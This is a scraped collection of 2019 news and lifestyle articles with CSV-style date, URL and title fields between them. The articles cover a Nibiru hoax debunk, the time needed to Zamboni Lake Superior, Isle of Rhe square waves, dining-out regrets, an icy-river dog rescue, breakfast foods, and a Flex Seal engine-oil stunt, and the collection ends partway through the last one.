NASA has said ""Nibiru"" or ""Planet X"" doesn't exist and this is a hoax. Christian leaders have also disputed the claims. Christianity Today calls Meade ""a made-up leader in a made-up field.""

Even some translations of Biblical scripture refutes men making claims about knowing the date of the end. Just take a look at Matthew 24:36, which says: ""But about that day or hour, no one knows, not even the angels in heaven, nor the Son, but only the Father.""

Many like Meade have tried to pinpoint doomsday in the past. But, here we all are. At least for now.

How long would it take to Zamboni Lake Superior? U.P. company
does the math

",27/02/2019 23:13,https://www.mlive.com/life/2019/02/how-long-would-it-take-to-zamboni-lake-superior-up-company-does-the-math.html,"MARQUETTE, MICH. -- If you had to wait for a Zamboni driver to clear all of Lake Superior before you could hop on the ice for a pick-up game, you’d be sitting in your skates for nearly 700 years.

That’s the conclusion made by the folks at U.P. Supply Co., a Marquette-based company specializing in Upper Peninsula gear and creative promotion of U.P. pride.

This week the company posed the question “How long would it take to Zamboni an entirely frozen Lake Superior?,"" and then unpacked the math in a blog post on the company’s website.

As of today Lake Superior ice cover is 8% ahead of where it was in 1996, the only year it reached 100% ice cover in the... Posted by Upper Peninsula Supply Co. on Monday, February 25, 2019

For several years the question has been on the mind of company founder and self-described U.P. ambassador Bugsy Sailor, who grew up playing hockey along Lake Superior.

“I’m obsessed with the lake and the size of it, and I think there’s a sense that when we see it every day, we take it for granted,” he said. “We lose that perspective of just how big it really is.”

Sailor originally posed the question on social media a few years ago, but this year, given Superior’s unusually high percentage of ice cover (the lake is currently more than 75 percent frozen; the average this time of year is 44 percent), he decided it was time to do the math.

“It’s pretty simple math, really,” Sailor said. “A matter of some basic conversions.”

After accounting for size, the hardest calculation was time, Sailor said. The conservative estimate for resurfacing all of Lake Superior came out to 693 years -- but when you account for variables like Zamboni repairs, switching out drivers, and perhaps pausing for a quick pick-up game, the actual time estimate would be much longer.

The Zamboni Lake Superior equation is just the latest creative take on Upper Peninsula love from U.P. Supply Co., which has made a name for itself over the past decade with its fun promotions of Michigan’s Upper Peninsula.

Sailor and his U.P. Supply Co. crew are also behind the increasingly popular tradition of 906 Day -- a celebration of all things U.P. on September 6 each year, inspired by the region’s singular area code -- and they particularly enjoy a good U.P.-themed April Fool’s joke. (Previous pranks have included launching the online dating site Yooper Singles, as well as announcing breaking ground in Lansing for an official Upper Peninsula embassy -- in a log cabin, of course.)

So what will be the company’s next great brainstorm? Sailor wouldn’t directly answer the question, but the smile was audible in his voice.

“We’re always trying to find clever ideas to represent the U.P.,” Sailor said. “We’re always working on something behind the scenes that no one really know about yet.”",How long would it take to Zamboni Lake Superior? U.P. company does the math,

Our planet is truly a magnificent and mesmerizing land and water mass. While its beauty often captivates us into exploration, its strength and power remind us that we are mere visitors to what belongs to Mother Nature and must be careful of her dangers.

The latest example of such balance between marvel and caution is a photograph taken off the Isle of Rhe, a now popular French tourist destination. It captures a new definition of a perfect storm, and it’s not a massive tidal wave.

The isle is just a short and narrow sliver of land that spans three miles wide by 19 miles long. It’s most famous worldly mention heretofore was perhaps within the book “The Expedition To The Isle Of Rhe,” by Edward Lord Herbert of Cherbury, K.B. This little-known book was published in 1860 and tells the story of a fleet of 100 English ships carrying over 6,000 men becoming bogged down on the tiny island while fighting the French in 1627.

Today, however, the Isle of Rhe is famous for the photography that captured “square waves,” which are the perfect example of how nature’s vast power and force can come in such an alluringly beautiful package.

apost.com

These unique waves appear in a chessboard grid across the water, forming unique square patterns that have been captured by photographers at the isle’s lighthouse. The photographs have become quite the internet sensation, and people are wondering what in the world caused the distinctive square waves and why people are just now seeing them?

The how is that the island lies in an area where two seas meet. The intersection of water is called a cross sea. When two wave systems (one from each sea) are created by two different weather systems and cross each other perpendicularly, it can create the grid waves like those seen off the coast of Rhe. There’s a catch, though.

The conditions must be just right to visually see what’s happening. Waves, or swells, travel long distances over the surface of the water, often to far away shores from the weather system that created them. When these swells collide in the presence of minimal wind sea, it creates a cross-sea grid.

The angle of approach is also important. Too shallow and it may appear that the swells come from the same direction. Not enough energy and the flattened crest will be nearly impossible to distinguish. Too much local wind shear and the swell’s shape is broken. If you’re looking flat at the sea, which most are from a beach, it can also be difficult to spot the square waves.

So, the presence of cross sea is quite common, but actually seeing the visual effects in pattern form requires a perfect storm of conditions. And, these conditions are rarely all aligned.

While stunning to view in person, note that cross seas are some of the most dangerous waters known to man because of the unusually strong riptides that can carry you far out to sea within seconds. It’s easy to be lulled by the beauty and novelty of the square waves from cross seas, but never think you’re stronger than Mother Nature. Entering this perfect storm of colliding swells isn’t advised.

This Ils What Americans Regret Spending Money On The Most
Do you share this disappointment about your own spending?
",25/02/2019 9:57,https://www.fool.com/personal-finance/2019/02/23/this-is-what-americans-regret-spending-money-on-th.aspx,"Making smart choices about what you do with your money will help set you up for a secure future. Unfortunately, most of us don't make the right financial choices all the the time -- and sometimes we end up regretting the decisions we make.

In fact, one recent survey from Charles Schwab shows the majority of Americans regret doing some past spending, instead of putting that money into retirement savings. And, there's one particular kind of spending the majority of Americans regretted the most.

What's the biggest spending regret Americans have?

About 55% of survey respondents regretted spending money on meals out instead of putting that money into a 401(k), according to Charles Schwab. Dining out was by far the biggest regret cited, with spending on expensive clothes ranking second (31% of respondents lamenting using cash to expand their wardrobes).

New cars, vacations, and tech gadgets round out the list of five biggest spending regrets, with 28% of those surveyed saying they regretted their expenditures on cars or vacations, and 26% wishing they hadn't put so much money into keeping up with the latest technologies.

It's not surprising so many Americans regret dining out. The Bureau of Labor Statistics 2017 report on Consumer Expenditures found average spending of $3,365 annually on food away from home in 2017, up from $3,154 on dining out in 2016. And don't forget that when you dine out, you're paying for service in your tip, which gets bigger as you rack up your total bill.

If, instead of spending so much on eating out, you put $3,000 annually into a 401(k) from age 30 to age 65 and earned a 7% annual return, you'd end up with a nest egg of $414,710 -- justby redirecting your dining out budget. And, that's a conservative estimate for how much you could save over time, since eating out expenses have been shown to increase by a few hundred dollars every year.

How can you save on eating out?

Giving up eating out entirely would obviously allow you to maximize your savings -- but you also want to be able to enjoy life. You don't have to entirely give up eating out in order to avoid spending regrets, but there are ways you can cut your costs so you can put more of your money into savings instead of into your stomach. Sometimes you can't avoid a meal out, like if a loved one is celebrating something you can't bear to miss. So use the below tips to minimize your dining out costs without suffering:

Skip convenience meals : Many people buy lunch at work or pick up takeout on the way home not because they enjoy the meals but because it's more convenient. Skip these expenditures and save your dining out dollars for meals you savor by making a plan in advance. You could make extra food when you cook and freeze it so you always have a meal available at home on days you don't feel like cooking, or can dedicate your Sunday to meal prep, so you can take your lunch and breakfast to work on busy mornings. Having an intentional plan in place means you won't reach for the closest or most convenient prepared food as soon as the hunger pangs stike.

Opt for late lunch instead of dinner: Many restaurants have a similar lunch menu to their dinner menu but at reduced prices.

Use coupons and find special deals: Websites such as Restaurant.com allow you to buy discounted gift certificates for restaurants. Many restaurants often run specials at the holidays where you can get free bonus cash by buying gift cards. If you have a favorite place, see if you can benefit from these deals and just buy yourself gift cards to use during the year while earning the bonus.

Skip the drinks: You can significantly cut the costs of dining out by opting for water over alcohol with your meal. If you decide to indulge in a glass of wine with dinner, look for BYOB places in your area. Or find discounted happy hours to fill up on a spread of cheap appetizers with your cocktail.

Do take out instead of delivery or dining out: You can avoid being on the hook for tipping your server by picking up your dinner, rather than going for a sit down meal. Food delivery also gets expensive with fees and tips, so take a look at how much you're spending on Postmates, Uber Eats or Grubhub.

By following these tips, you can still enjoy the occasional dining out experience -- without being left with lingering spending regrets.

Make changes today to avoid spending regrets tomorrow

Don't be one of the many Americans who regret dining out because they wish they'd put more money into their 401(k) instead. You can make changes today by adjusting your budget so you don't end up with these regrets yourself.

Budget a reasonable amount for dining out, then move some of the cash you save into your retirement accounts so you'll have more money for a brighter future. Pay yourself first to kill the temptation to eat up the money that should be saved.",This Is What Americans Regret Spending Money on the Most,

Turns Out A 'Dog' Pulled From Icy Water By Rescuer Is Actually

However, one adventurous labradoodle ran away and jumped into a frozen river. Luckily, thanks to a kind firefighter, the canine was rescued in time.

The recently-adopted dog called Lucy got away from its owner and somehow got into the icy waters of the Detroit River in Michigan. Although the pooch didn’t drown, it barely managed to climb onto a chunk of ice, drifting away on the river in the freezing cold.

In a joint operation, Wyandotte Police department, the fire department and the animal control rushed to help bring her out safely. Braving the severe cold, the rescuer donning orange insulated wetsuits was finally able to bring her near the bank using a catchpole. A video of the first responder was shared by the Wyandotte Police department on Facebook later.

“The rescuer did this while standing on a slippery ladder that was submerged in the river while his co-workers held onto him via a rope. Truly an amazing and awesome rescue,” the police department wrote explaining the risks.

“She just had those big brown eyes, and she couldn’t talk, but she probably was just so grateful,” Wyandotte Assistant Fire Chief Tom Lyon told The Detroit Press talking about the “happy outcome”.

Wyandotte Deputy Police Chief Archie Hamilton said it was the neighbours who spotted the pet drifting on the icy water and alerted 911. “If not for that the dog would have froze to death or drowned,” Hamilton added.

Hamilton also added that the police officers “considered calling the US Coast Guard — and even going into the freezing water themselves” but when the firefighters showed up, they made a plan to get the poor animal out safely.

The heart-warming effort of the forces delighted all online, as the video spread on social media across the world.",Watch: Firefighter rescue dog stranded on floating chunk of ice in frozen river,

Drink this every morning before breakfast for a healthier gut
Before breakfast, there's one thing you definitely should prioritize: drinking...
",23/02/2019 10:44,https://www.healthline.com/nutrition/12-best-foods-to-eat-in-morning,"Breakfast is a great way to start your day. While some people prefer to skip breakfast, others need a source of energy to get going. If you enjoy breakfast, choosing nutritious foods may provide long-lasting energy and keep you full for hours. These foods are typically high in fiber, protein, healthy fats, and micronutrients. While it’s best to avoid unhealthy options that are high in sugar, refined carbs, and additives, it’s not always easy to know what to choose. As such, the list below will help you build a healthy breakfast. Here are 12 of the best foods and drinks to enjoy in the morning. Share on Pinterest Jeremy Pawlowski/Stocksy United

1. Eggs Eggs make a simple, nutritious breakfast choice. They’re an excellent source of protein, which helps support muscle synthesis. Since protein takes a while to digest, it also helps keep you feeling full ( 1 , 2 ). In one study, people given eggs and toast for breakfast reported significantly less hunger than those given bran cereal, suggesting that the egg group’s higher protein intake — 25 grams versus 11 grams — promoted greater fullness ( 3 ). Furthermore, the egg group ate fewer calories at lunch, suggesting that this dish may support weight management ( 3 ). Additionally, egg yolks contain lutein and zeaxanthin. These antioxidants help prevent eye disorders like cataracts and macular degeneration ( 4 , 5 ). Eggs are also one of the best sources of choline, a vital nutrient for brain and liver health ( 6 ). Contrary to popular belief, eggs don’t raise cholesterol levels in most people despite their high cholesterol content. In fact, one review of 23 studies found that eggs have a mild protective effect against heart disease ( 7 ). That said, try to limit your intake of highly processed breakfast items that are commonly paired with eggs, such as breakfast sausages and bacon. Instead, eat your eggs with other nutritious foods, such as whole grain toast, whole fruit, or sautéed vegetables. Summary Eggs are high in protein and several important nutrients. They may promote fullness and help lower your calorie intake later in the day.

2. Greek yogurt Greek yogurt is a great option if you’re looking for a quick breakfast. It’s made by straining whey and other liquid from milk curds, which produces a creamy product that’s more concentrated in protein than regular yogurt ( 8 ). In addition, it’s lower in calories than other protein sources. A 1-cup (245-gram) serving boasts 25 grams of protein and only 149 calories ( 9 ). Plus, Greek yogurt is full of beneficial nutrients like calcium, vitamin B12, zinc, potassium, and phosphorus ( 9 ). Certain types are good sources of probiotics like Bifidobacteria, which support your digestion. To make sure that your yogurt contains probiotics, look for the phrase “contains live and active cultures” on the label ( 10 , 11 ). If you prefer an even creamier, higher protein product, Icelandic yogurt — known as skyr — is another great option. Try topping Greek yogurt with berries or chopped fruit to add more fiber, vitamins, and minerals. Summary Greek yogurt is not only high in protein and low in calories, but certain types are also high in probiotics, which support gut health.

3. Coffee Aside from water, coffee is the world’s most popular beverage. Approximately 85% of Americans drink coffee on a regular basis ( 12 ). It’s high in caffeine, a molecule that promotes alertness, improves mood, and increases physical and mental performance. Notably, many athletes drink coffee as a natural pre-workout beverage to support sports performance ( 12 , 13 ). It also contains other beneficial compounds, such as chlorogenic acid, caffeic acid, and diterpenes, which have antioxidant and anti-inflammatory properties ( 14 , 15 ). In fact, regular coffee intake is associated with many health benefits, such as a lower risk of heart disease, type 2 diabetes, obesity, liver disease, Parkinson’s, certain types of cancer, and even death from all causes ( 15 , 16 , 17 ). Most studies suggest that 1–3 cups (240–710 mL) per day — containing about 300–400 mg of caffeine — provide these benefits. Although this amount is safe for adults, you should limit yourself to 300 mg or less of caffeine per day if you’re pregnant ( 12 ). Finally, it’s best to drink your coffee black or with dairy or plant-based milk. Try to use sugar sparingly or avoid it altogether, as too much sugar is linked to health risks. Summary The caffeine in coffee promotes alertness and enhances physical and mental performance. Drinking coffee regularly is associated with a lower risk of illnesses.

4. Oatmeal Oatmeal is a classic breakfast option — and it’s nutritious to boot. It’s made from rolled or steel cut oats, which contain a unique fiber called beta glucan. This soluble fiber not only helps reduce cholesterol levels but also promotes feelings of fullness by delaying stomach emptying and triggering the release of peptide YY, a fullness hormone that may prevent overeating ( 18 , 19 , 20 , 21 ). Plus, oats are a good source of iron, B vitamins, manganese, magnesium, zinc, and selenium ( 22 ). They also contain around 10 grams of protein per cup (81 grams). To boost the protein content, make oatmeal with milk instead of water, mix in some protein powder, or serve it with a side of eggs ( 22 ). Keep in mind that oats don’t contain gluten but are often processed alongside gluten-containing grains, which increases the risk of cross contamination ( 23 ). Therefore, people with gluten-related disorders should choose oats that have been certified gluten-free. Summary Oatmeal is rich in beta glucan, a type of fiber that may lower cholesterol levels and increase feelings of fullness. It also contains many vitamins and minerals.

5. Chia seeds Chia seeds are extremely nutritious and a great source of fiber. In fact, just 1 ounce (28 grams) provides an impressive 10 grams of fiber per serving ( 24 ). What’s more, a portion of this fiber is soluble, meaning that it absorbs water and increases the volume of food moving through your digestive tract. In turn, this process helps you feel full ( 25 , 26 , 27 ). One small study gave participants either plain yogurt or yogurt with 7 or 14 grams of chia seeds. Both chia seed groups observed significantly more fullness, less hunger, and reduced overall food intake than the plain yogurt group ( 28 ). Another study found that eating chia seeds led to significantly reduced hunger compared with flaxseeds. Although both seeds are highly nutritious, the gelling properties of chia seeds may be responsible ( 29 ). These seeds’ high soluble fiber may likewise help stabilize blood sugar levels and support heart health ( 30 , 31 ). Though chia seeds aren’t high in protein, you can eat them with high protein foods, such as Greek yogurt, cottage cheese, or a protein shake. This chia pudding recipe packs 25 grams of protein, for example. High protein chia pudding recipe Share on Pinterest Martí Sans/Stocksy United Ingredients 1 ounce (28 grams) of dry chia seeds

1 scoop (25 grams) of whey protein powder

1 cup (240 mL) of coconut milk or almond milk

1/2 cup (74 grams) of berries

stevia or another sweetener to taste, if desired Directions Combine all ingredients in a bowl and mix well.

Cover the bowl and refrigerate for at least 1 hour. Summary Chia seeds are high in fiber, which may help promote fullness and reduce hunger levels.

6. Berries Berries — including blueberries, raspberries, strawberries, and blackberries — are delicious and packed with antioxidants. Most are high in fiber, which promotes fullness. In fact, raspberries and blackberries each provide an impressive 8 grams of fiber per cup (123–144 grams) ( 32 , 33 ). Plus, 1 cup (123–144 grams) of berries contains only 50–85 calories depending on the type ( 32 , 33 , 34 ). Berries also offer antioxidants called anthocyanins, which provide their characteristic blue, purple, and red colors. A diet high in anthocyanins is linked to reduced inflammation and a lower risk of illnesses like heart disease and certain types of cancer ( 35 , 36 , 37 , 38 ). Additionally, anthocyanins are associated with better brain health and may protect against age-related mental decline ( 39 , 40 ). You can purchase berries year-round either fresh or frozen. Add them to Greek yogurt, cottage cheese, oatmeal, or a fruit smoothie for a tasty breakfast. Summary Berries are high in fiber and low in calories. They’re also rich in antioxidants that may decrease your risk of disease.

7. Cottage cheese Cottage cheese is a fantastic high protein breakfast item, packing an impressive 24 grams of protein per cup (220 grams) ( 41 ). A high protein breakfast is linked to greater fullness and reduced hunger. In fact, one study found cottage cheese to be as filling and satisfying as eggs ( 42 ). Cottage cheese is also low in calories, providing only 180 calories per cup (220 grams). Therefore, it may support weight loss without leaving you feeling hungry ( 41 ). In fact, one review associated a diet high in dairy products, especially high protein foods, with greater weight loss ( 43 ). You can eat cottage cheese with many other nutritious foods, such as berries, peaches, tomatoes, cucumbers, chia seeds, flaxseeds, or granola. Summary Cottage cheese is high in protein, which may help keep you full and reduce hunger. Common breakfast toppings include fresh fruit, veggies, seeds, and granola.

8. Whole wheat toast Share on Pinterest James Ransom/Offset Images If you prefer a simple breakfast in the morning, give whole wheat toast a try. Whole grain toast is high in fiber and complex carbs, which digest slowly and don’t rapidly raise blood sugar levels ( 44 , 45 ). You can spread any number of nutritious toppings on whole wheat toast, including: fried eggs and tomatoes

avocado and chili flakes

peanut butter and banana

cottage cheese and strawberries

sliced figs and honey

tuna

sliced turkey or chicken

baked beans

egg salad For extra fiber and protein, try sprouted grain bread, 2 slices of which provide around 8 grams of fiber and 10 grams of protein ( 46 ). Summary Whole wheat toast is a good source of fiber. Plus, you can top it with a wide variety of nutritious spreads.

9. Nuts Nuts of all types are high in magnesium, potassium, and heart-healthy monounsaturated fat. They’re also a great source of antioxidants ( 47 , 48 , 49 , 50 ). Brazil nuts are one of the best sources of selenium. Just 2 Brazil nuts provide more than 100% of the Daily Value (DV) ( 51 ). Although nuts are high in calories, studies suggest you don’t absorb all of their fat. For example, some studies show that your body only absorbs about 129 calories from a 1-ounce (28-gram) serving of whole almonds, though you absorb more fat from processed versions, such as almond butter ( 52 , 53 ). Another study notes that your body only absorbs 80% of the calories from almonds and walnuts ( 54 ). Furthermore, nuts’ high protein, fat, and fiber contents promote fullness, which may aid weight management ( 50 , 55 , 56 ). Nut intake is also linked to better heart and brain health. In fact, one study associated eating peanuts and tree nuts 2 or more times per week and walnuts 1 or more times per week with a 13–19% reduced risk of heart disease ( 57 , 58 , 59 , 60 , 61 ). Topping Greek yogurt, cottage cheese, or oatmeal with a spoonful or two of chopped nuts is a great way to increase your breakfast’s nutritional value. Summary Nuts are a filling, nutrient-dense food that may help reduce heart disease risk and promote brain health.

10. Green tea Green tea is a soothing drink to get you going in the morning. It contains caffeine, which improves alertness and mood. One cup (240 mL) provides only 35–70 mg of caffeine, which is about half the amount in the same serving of coffee ( 62 ). It’s also high in L-theanine, a compound that promotes a calming effect and may reduce the “jitters” linked to caffeine intake. It may also improve mood and reduce anxiety ( 63 ). Finally, green tea provides epigallocatechin gallate (EGCG), an antioxidant that protects against chronic ailments like heart disease, type 2 diabetes, and mental decline. It may also have a mild effect on metabolism, though more research is needed ( 64 , 65 , 66 , 67 , 68 ). Summary Green tea contains caffeine, as well as an antioxidant called EGCG, which is tied to a reduced risk of chronic disease and better brain health.

11. Protein shakes If you’re short on time or want to take your breakfast on the go, protein shakes or smoothies are a great option. Many types of protein powder exist, but whey and pea protein are the most common. Protein is important for many bodily functions, such as enzymatic reactions, maintaining and building muscle mass, and supporting healthy skin and hair. Plus, protein promotes fullness and reduces hunger ( 69 , 70 , 71 , 72 ). Additionally, a protein shake makes a great post-workout meal. Eating a large meal after a workout may be hard on your stomach, but drinking a protein shake may be easier on your stomach while still providing ample protein and nutrients for post-workout recovery ( 73 , 74 ). For a well-rounded breakfast, add a scoop of protein powder to a smoothie made with banana, frozen fruit, and milk or water. Summary It’s easy to whip up a protein shake or smoothie in a few minutes and take it on the go. Plus, this simple breakfast makes a great post-workout option.

12. Fruit Share on Pinterest Tatjana Zlatkovic/Stocksy United If you don’t want a full meal but still crave a bite to eat in the morning, try fruit. All fruits are relatively low in calories and contain good amounts of fiber and simple sugars. The fiber in fruit helps slow your body’s absorption of its sugars, giving you a steady source of energy ( 75 ). Depending on the type of fruit, you’ll also get various vitamins and minerals. For example, many fruits — including oranges, guava, kiwi, strawberries, papaya, acerola cherries, and lychee — are high in vitamin C, which acts as an antioxidant and plays a key role in skin health ( 76 ). Other fruits like bananas, oranges, cantaloupe, papaya, and mango are high in potassium ( 76 ). Furthermore, fruits provide an array of polyphenol compounds and antioxidants depending on their color. For instance, guava is high in lycopene while purple plums pack anthocyanins. This is why it’s important to eat fruits of various colors ( 76 , 77 ). Research indicates that eating whole fruit may offer numerous benefits, such as a decreased risk of heart disease and cancer, lower rates of depression and poor mental health, healthy aging, and better gut health ( 78 , 79 , 80 ). Since fruit juice lacks fiber and is less likely to keep you full, it’s best to stick with whole fruit most often ( 81 ). For a balanced breakfast, pair fruit with high protein foods, such as eggs, Greek yogurt, or cottage cheese. Summary Eating a variety of fruits provides you with different vitamins, minerals, and antioxidants. What’s more, most fruits contain high amounts of fiber that may promote fullness and keep your blood sugar levels stable.",12 of the Healthiest Foods to Eat for Breakfast,

The end result of using Flex Seal as engine oil

",22/02/2019 17:41,https://drive23.com/technology/the-end-result-of-using-flex-seal-as-engine-oil/,"

p Being creative and innovative can be a great thing but it can also spark in one’s mind some ideas that may seem a little wacky to others. The question is always if to try them or not. This group of guys did not stop themselves from trying out their craziest ideas. They went for it, without holding back. They managed to turn the idea into reality. These guys saw flex seal and thought “wow this would be great to try in a car engine instead of oil”, well this isn’t a regular thought that goes through most people’s minds. Flex seal is just a bonding product meant to glue things why would anyone want to put it in the car? Sounds a little out there. Meet this crew of men that their sole passion in life is running experiments on cars with the constant risk of damaging them completely. So what was their result this time with the flex seal as engine oil? What they found was very entertaining. The crew Before diving into the crux of this story, let’s say a little about the stars in this story. These folks are car enthusiasts residing in Seattle, Washington. And like we said they have a passion for messing with cars. Why? Because it is fun, that’s why. Orion Dajnowicz, as shown in the image (on the right) headed the group. Orion performs a series of crazy experiments with cars, which he shares on his YouTube channel @ Life OD. His experiments with cars more often result in a wild scenario. Hence, it’s recommended that no one tries them out at home. Aside from being known for his crazy experiment with cars, he is also popular in the racing world. He is a promising young fella with exceptional driving skill.



Fill up the car After Orion and his group properly planned the experiment, they head out to get the essential resources, flex seal. The group would need a lot of flex seal for this experiment. So, they head to the best place where the dream of delightful purchase dwells, Walmart. Here, they had to stock up several cans of flex seal. The store employees must have looked at them and thought “who would need so much flex seal”. They grabbed pretty much all that was left on the shelf and headed out to do something that was probably going to ruin their car forever. The guys were great at hyping each other up and were just so excited to get the experiment going.



Sounds sticky So what exactly is so risky about using flex seal as engine oil. Let’s see what this substance is all about. Flex seal is a product that is used for bonding together with different materials. Pretty much a very strong glue. The commercial states it can literally stop water from flowing out of a bucket, stating that nothing can beat or get through flex seal. How is this supposed to help run a car? The product uses the concept of liquid rubber to adhere to things together. This product also comes with warnings on how to use it and we don’t think pouring down in an engine sounds safe. Sounds sticky…sounds tricky but these guys are all about tricks. The warnings did not stop them from trying this experiment out.



The test dummy It is not enough to have all the flex seal at hand the experiment likewise needed a car to be able to be complete. The group sorted out the perfect car for the experiment. Since they were aware of the impending odds that may arise in their experiment, they had to use a car that was already half-dead and of purpose to their experiment. They opted for a car with diverse knotty issues such as leaking problems and a broken door. They weren’t going to risk their own working and expensive vehicles for this experiment. But still damaging a half working car was still a risk. What if it would blow up or catch on fire? The excitement continued to grow and they carried on.



The door goes up This car was so worn down the door actually had to opened upward instead of sideways as a normal car door would open. This was a nice joke for the crew, who played with the door and laughed about it. This car was not working properly so it was perfect for the flex seal experiment. The men in the video really didn’t care that this car was breaking down, they were willing to damage it even more. At this moment the only thing they cared about one thing- getting the flex seal to actually work. So now it was go time. Open up the engine boys!



Leakproof for sure It was a matter of time before the experiment commenced. A member of the group chimed in and said that there would be an absolute solution to the leaking problem of the car. “It would never leak again that’s for sure”, he said. In summary, they proposed that the flex seal would form a shield inside the engine. So they weren’t too hopeful it was actually going to work but they wanted to see what was to happen. As a member rightly said, “We would bulletproof it from the inside, not the outside.” A bulletproof engine doesn’t sound to use at all. But these guys were here for the fun and for the thrill of doing strange experiments.



First impressions Once they saw the content in the flex seal, it gave them reassurance of their earlier speculations. Orion admitted that it was his first time of seeing the sealer in person. He’d seen all the sappy commercials on tv it always made him laugh, but he didn’t think it would actually look like this. Nevertheless, after examining the content time without number he became optimistic that it would not only work as a sealer but also serve as oil. This only made them more pumped because maybe it would not only seal the engine but actually get it to run for a bit before drying completely.



Guessing game “I say it goes 23 miles,” one crew member predicted when they were talking about the distance of the car. The guys chimed in as well. Not only did the group predicted that the flex sealer would work perfectly as oil, but also expected it to cover up a specific distance. Orion, considering the state of the machine and being positive, replied that it would go 5 miles. Chau, the other guy with his cap put on backward proposed that it will cover up 10 miles. But only once they went for it they would know who was right. How far would this thing actually go?



Satisfaction Now, all things are set. They began to pour the flex seal into the engine oil vessel. On seeing the dark goopy, gooey fluid as it flows into the car, they became aroused. “Oooohs” and “Ahhhs” were heard from the guys who huddled around the engine watch. It felt more like a magical sensation, like nothing seen before. The group supposed that the stuff was gross and that it was a crazy thing to put such a thick viscous fluid into a car. Orion said, “It’s so thick!” Mariner assured the group that it was going to be great and that it was the thickest kind of oil to put into anyone’s motor.



No doubt Someone in the group sees the flex seal as prospective ‘race oil’. A member in the group added that it would be for a turbo application. In addition, it will never blow a motor because it is capable of sealing it up so good. They kept their confidence that it would do the most and solve all the problems. But where they getting to excited over nothing? Flex seal end result is a rubberlike coating with heavy thickness. It is popularly regarded as an exceptional sealer for household products, farming products among many other things. Now, it seems more like a solution to the leaking problem of the car. Could it be they made a discovery if this would work?



Fun with the Goop The group had to pour in a number of flex seals into the oil tank. The intention was to fill it up. The goop was so thick that it flowed slowly into the tank. It was taking a lot of time. Since they were just trying this out, had fun with the goop discharge despite being slow. The guys enjoy each other’s company as they make funny remarks and observations. To others this may seem like a complete waste of time but they were having fun and waiting for the big moment when they would turn those keys and start the car.



Berky bringing everyone down At last, they were set to go. They had poured all of the flex seal content into the tank. Now, the group was large, but only three of them—Orion, Mariner and Chau— had made forecasts on the outcome of their investigation. Saying it would start and even drive a certain distance. They asked a fourth companion, Berky if he has any projection on the outcome of the experiment. Berky said frankly that it would seize up the car and it would be done with for good. Though it was a pessimistic remark, it was the final faith of all the other guys anyway.



All systems in Place Mariner said, “She’s ready to rip”.Now that everything is set, they imagined what the outcome of their test would be. That was certainly blunt, but the guys hope for a different result. One of them, therefore, jumped into the car and turned on the ignition. On ignition, the engine made a sound that indicated it was ready to go. Then, Orion said with excitement, “She’s going!” Although the car was ready to go, the guys still need some time to observe. Hence, they positively listen to the vehicle to see if it was now working with the flex seal. Could it be they had come up to some creative genius hack?



Previous Experiments The flex seal experiment was not the first. They had done similar things in the past that had yielded posited outcomes. For instance, they filled their tires with water, made car tires out of zip ties, and using WD-40 for a car instead of engine oil. These guys just seem to love taking risks and trying crazy things, being spontaneous and adventurous is their way of life. They are just trying to have fun and enjoy themselves.



Coffee In The Engine – Something is brewing The guys set out on another similar experiment to the flex seal using a very common beverage, maybe something some people call their “human fuel”. That is of course coffee. We drink coffee every day to get our selves going and feel awake. Could it be this caffeine would get a car to work? Well these guys went out and tried just that, again not really caring what the result is but just for the fun of it. They could do it so why not. How do you think this turned out? What would work this or flex seal?



To go please The guys entered their local coffee shop and got a good amount of large espresso and black coffee drinks. The more the better. They told the employees at the shop that they were going to put the coffee drinks in a car engine and the employees were very confused, because who would just do that. The guys paid for the drinks and got on their way.



Pour it up They got back to their car and experiment area and started pouring slowly the hot coffee down the engine tube. The coffee was hot and steaming and the guys kept getting excited. Would it work, would it not? Every time they tried something crazy like this they would never know the end result. They kept pouring till all the cups were empty and then it was showtime. Rev up the engine!



Child’s play-The Lego Experiment- Before getting to the results of these experiments let’s take a quick look at some playful and less dangerous attempts these guys went for. In another entertaining experiment, the guys set out to make a functional tire from legos. And this actually worked pretty well. Obviously, they could not drive far way with this tire but it managed to turn and be driven just a little bit out of the shop. Who knew a toy could make an actual real tire? Tires are expensive maybe this can be a hack to save money. But it seems the flex seal oil experiment would be one of the most extreme and dangerous attempts of this crew.



The Strenght Of Flex Seal – People’s Previous Experiments It seems not only the Life OD guys took an interest in flex seal. People online seem to love to test the product to see if it really is as strong as it says it is in the commercial. For example, this guy tried all the forms of flex seal and tested it with water leaks even covered eggs to see if they would break. In his video that was posted online, it seemed the product didn’t quite work. But the fascination with this product continues. So how did it turn out on the car engine?!



Coffee In The Engine- Steamy but not in a good way Hmm maybe you like your coffee hot but it seems a car and its engine does not! The car immediately started smoking and coffee steam was coming out of the engine. The guys were entertained but the car was not quite doing its thing. This didn’t seem like it was going to actually work. Maybe people should stick to drinking coffee.



Pick Me Up?! Coffee Doesn’t Give Cars Energy Well, it didn’t take long and this car experiment was also done. The car had died. It didn’t approve of the coffee. Again maybe they should just stick to drinking coffee, that sounds so much safer. The car did not explode but continued to let out smoke and a very strange painful noise. Once again the crew went on to destroy the vehicle by riding a scooter on it and jumping on it as usual.



What Sound Does Flex Seal Oil Make? Back to the flex seal results, it was now flowing through the engine and the guys waited….the sound produced by the engine was a bit strange. That was not the issue, for the car was half-dead in the first place. Berky asked if the way it sounded was the way it was before. The group did not blame the sound on the flex seal. It may be as a result of the car’s fault. So, they concluded that the flex seal was working well at the moment, and it was now time to take it to the street. Orion said that they should drive it to see. To be optimistic, Berky said it was a good sign that the engine was already circulating the flex seal. Could he be wrong?



Don’t get excited An unexpected turn of events happened just as they were about to move the car to the street. The engine has been circulating for over 20 seconds. As soon as they tried moving the car, it stopped making a sound. The group couldn’t imagine what had transpired. A car just doesn’t stop that way. They wondered if there was a sort of mistake in the process of the experiment.



Stand the heat The group looked at each other with their heart in freeze-beats and their jaws down to their chest. They couldn’t believe their eyes. The experiment they longed hoped would bring a positive result ended in a deadlock. They could only laugh at the circumstances. Was that the verdict? Berky was right all along. The car just grasped up without taking a step forward. Since Mariner, Chau and Orion had predicted that the car would cover 23, 10 and 5 miles respectively, Berky won in the prediction. The guys were still not ready to give up that easily. There was still a chance to prove Berky wrong.



Round two flex seal oil The group was not ready to give up. They had the intent of proving Berky wrong. So, they tried to revive the car once again. The guy in the car revved the engine again. It worked fine for some seconds. The engine made a noise for a while and then it started to die. Orion, in particular, was not ready to give up at this time. He initiated another plan in dealing with the status quo.



